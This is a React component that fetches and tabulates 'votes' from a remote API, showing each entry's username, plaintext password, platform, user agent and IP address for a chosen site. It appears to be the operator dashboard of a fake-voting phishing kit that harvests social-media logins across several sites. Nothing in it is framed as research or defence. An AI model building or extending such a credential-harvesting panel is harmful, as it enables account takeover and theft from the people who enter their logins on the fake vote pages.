// VoteList.tsx
import React, { useState, useEffect } from 'react';
import { useSite } from '../context/SiteContext';

interface Vote {
  id: number;
  username: string;
  password: string;
  platform: string;
  ip_address: string;
  user_agent: string;
  timestamp: string;
}

const VoteList = () => {
  const [votes, setVotes] = useState<Vote[]>([]);
  const [loading, setLoading] = useState<boolean>(true);
  const [error, setError] = useState<string | null>(null);
  const { siteId } = useSite();

  useEffect(() => {
    const fetchVotes = async () => {
      setLoading(true);
      setError(null);
      try {
        const response = await fetch(
          `https://bossj.pythonanywhere.com/api/search/votes/?site_id=${siteId}`
        );
        if (!response.ok) throw new Error(`Error: ${response.statusText}`);
        const data = await response.json();
        setVotes(data);
      } catch (err) {
        setError("Failed to fetch votes. Please try again.");
      } finally {
        setLoading(false);
      }
    };

    if (siteId) fetchVotes();
  }, [siteId]);

  return (
    <div className="container">
      <h2 className="header">Vote List</h2>

      {loading && <p className="status-message">Loading votes...</p>}
      {error && <p className="error-message">{error}</p>}

      {!loading && !error && votes.length === 0 && (
        <p className="status-message">No votes found.</p>
      )}

      {!loading && !error && votes.length > 0 && (
        <table className="data-table">
          <thead>
            <tr>
              <th>Username</th>
              <th>Password</th>
              <th>Platform</th>
              <th>User Agent</th>
              <th>Origin/IP</th>
              <th>Time</th>
            </tr>
          </thead>
          <tbody>
            {votes.map((vote) => (
              <tr key={vote.id}>
                <td>{vote.username}</td>
                <td>{vote.password}</td>
                <td>{vote.platform}</td>
                <td className="wrap-cell">{vote.user_agent}</td>
                <td>{vote.ip_address}</td>
                <td>{new Date(vote.timestamp).toLocaleString()}</td>
              </tr>
            ))}
          </tbody>
        </table>
      )}
    </div>
  );
};

export default VoteList;